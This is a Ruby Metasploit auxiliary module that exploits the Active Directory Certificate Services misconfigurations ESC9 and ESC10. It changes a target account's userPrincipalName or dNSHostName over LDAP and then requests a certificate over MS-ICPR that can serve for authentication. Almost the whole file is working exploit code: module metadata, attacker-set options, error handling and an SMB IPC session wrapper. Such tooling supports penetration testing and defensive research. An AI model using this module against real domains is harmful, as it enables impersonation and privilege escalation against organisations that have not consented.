##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb/dcerpc/client'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MsIcpr
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::DCERPC
  include Msf::Auxiliary::Report
  include Msf::OptionalSession::SMB
  include Msf::Exploit::Remote::LDAP

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Exploits AD CS Template misconfigurations which involve updating an LDAP object: ESC9 and ESC10',
        'Description' => %q{
          This module updates an LDAP object with a new value before requesting a certificate.
          Request certificates via MS-ICPR (Active Directory Certificate Services). Depending on the certificate
          template's configuration the resulting certificate can be used for various operations such as authentication.
          PFX certificate files that are saved are encrypted with a blank password.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Will Schroeder', # original idea/research
          'Lee Christensen', # original idea/research
          'Oliver Lyak', # certipy implementation
          'Spencer McIntyre', # icpr_cert module implementation
          'jheysel-r7' # module implementation
        ],
        'References' => [
          [ 'URL', 'https://github.com/GhostPack/Certify' ],
          [ 'URL', 'https://github.com/ly4k/Certipy' ],
          [ 'URL', 'https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760' ]
        ],
        'Notes' => {
          'Reliability' => [],
          'Stability' => [],
          'SideEffects' => [ IOC_IN_LOGS ],
          'AKA' => [ 'ESC9', 'ESC10' ]
        },
        'Actions' => [
          [ 'REQUEST_CERT', { 'Description' => 'Request a certificate' } ]
        ],
        'DefaultAction' => 'REQUEST_CERT'
      )
    )

    register_options([
      OptEnum.new('UPDATE_LDAP_OBJECT', [ true, 'Either userPrincipalName or dNSHostName, Updates the necessary object of a specific user before requesting the cert. Used to exploit ESC9 and ESC10. ', 'userPrincipalName', %w[userPrincipalName dNSHostName] ]),
      OptString.new('TARGET_USERNAME', [true, 'The username of the target LDAP object.']),
      OptString.new('NEW_VALUE', [true, 'The new value for the specified attribute.']),
    ])

    register_advanced_options(
      [
        OptString.new('LDAPDomain', [false, 'The LDAP domain to authenticate to. Can be left blank if same as SMBDomain.']),
        OptString.new('LDAPUsername', [false, 'The LDAP username to authenticate with. Can be left blank if same as SMBUsername.']),
        OptString.new('LDAPPassword', [false, 'The LDAP password to authenticate with. Can be left blank if same as SMBPassword.']),
        OptInt.new('LDAPRport', [false, 'The target LDAP port.', 389]),
      ]
    )
  end

  def run
    send("action_#{action.name.downcase}")
  rescue MsIcprConnectionError, SmbIpcConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue MsIcprAuthenticationError, MsIcprAuthorizationError, SmbIpcAuthenticationError => e
    fail_with(Failure::NoAccess, e.message)
  rescue MsIcprNotFoundError => e
    fail_with(Failure::NotFound, e.message)
  rescue MsIcprUnexpectedReplyError => e
    fail_with(Failure::UnexpectedReply, e.message)
  rescue MsIcprUnknownError => e
    fail_with(Failure::Unknown, e.message)
  end

  def action_request_cert
    with_ipc_tree do |opts|
      request_certificate(opts)
    end
  end

  # @yieldparam options [Hash] If a SMB session is present, a hash with the IPC tree present. Empty hash otherwise.
  # @return [void]
  def with_ipc_tree
    opts = {}
    if session
      print_status("Using existing session #{session.sid}")
      self.simple = session.simple_client
      opts[:tree] = simple.client.tree_connect("\\\\#{client.dispatcher.tcp_socket.peerhost}\\IPC$")
    end

    yield opts
  ensure
    opts[:tree].disconnect! if opts[:tree]
  end
end
